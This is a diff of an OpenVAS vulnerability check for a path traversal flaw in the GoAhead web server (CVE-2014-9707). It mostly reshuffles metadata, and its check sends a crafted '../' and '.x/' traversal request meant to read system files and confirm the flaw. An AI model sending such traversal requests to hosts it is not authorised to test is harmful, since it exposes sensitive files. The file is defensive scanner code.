@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_goahead_webserver_mult_vuln_apr15.nasl 7577 2017-10-26 10:41:56Z cfischer $
+# $Id: gb_goahead_webserver_mult_vuln_apr15.nasl 11188 2018-09-03 11:04:26Z cfischer $
 #
 # GoAhead Webserver Multiple Vulnerabilities - Apr15
 #
@@ -27,13 +27,24 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805521");
-  script_version("$Revision: 7577 $");
+  script_version("$Revision: 11188 $");
   script_cve_id("CVE-2014-9707");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-03 13:04:26 +0200 (Mon, 03 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-04-06 09:25:29 +0530 (Mon, 06 Apr 2015)");
   script_name("GoAhead Webserver Multiple Vulnerabilities - Apr15");
+  script_category(ACT_ATTACK);
+  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
+  script_family("Web Servers");
+  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
+  script_require_ports("Services/www", 80);
+  script_mandatory_keys("GoAhead-Webs/banner");
+
+  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/131156");
+  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Mar/157");
+  script_xref(name:"URL", value:"https://github.com/embedthis/goahead/issues/106");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/535027/100/0/threaded");
 
   script_tag(name:"summary", value:"This host is installed with GoAhead Webserver
   and is prone to multiple vulnerabilities.");
@@ -59,18 +70,6 @@ if(description)
   script_tag(name:"qod_type", value:"exploit");
   script_tag(name:"solution_type", value:"VendorFix");
 
-  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/131156");
-  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2015/Mar/157");
-  script_xref(name : "URL" , value : "https://github.com/embedthis/goahead/issues/106");
-  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/archive/1/535027/100/0/threaded");
-
-  script_category(ACT_ATTACK);
-  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
-  script_family("Web Servers");
-  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
-  script_require_ports("Services/www", 80);
-  script_mandatory_keys("GoAhead-Webs/banner");
-
   exit(0);
 }
 
@@ -78,34 +77,23 @@ include("misc_func.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Variable Initialization
-http_port = 0;
-url = "";
-files = "";
-
-## Get http port
 http_port = get_http_port(default:80);
 
-## Check Banner And Confirm Application
 banner = get_http_banner(port:http_port);
-if("GoAhead-" >!< banner) {
+if("GoAhead-" >!< banner){
   exit(0);
 }
 
-## traversal_files() function Returns Dictionary (i.e key value pair)
-## Get Content to be checked and file to be check
 files = traversal_files();
-foreach file (keys(files))
-{
-  ## Construct directory traversal attack
-  url = "/" + crap(data:"../",length:3*5) + crap(data:".x/",length:3*6)
-            + files[file];
+foreach file (keys(files)){
 
-  ##  Confirm exploit worked properly or not
-  if(http_vuln_check(port:http_port, url:url, pattern:file))
-  {
-    report = report_vuln_url( port:http_port, url:url );
+  url = "/" + crap(data:"../",length:3*5) + crap(data:".x/", length:3*6) + files[file];
+
+  if(http_vuln_check(port:http_port, url:url, pattern:file)){
+    report = report_vuln_url(port:http_port, url:url);
     security_message(port:http_port, data:report);
     exit(0);
   }
 }
+
+exit(99);
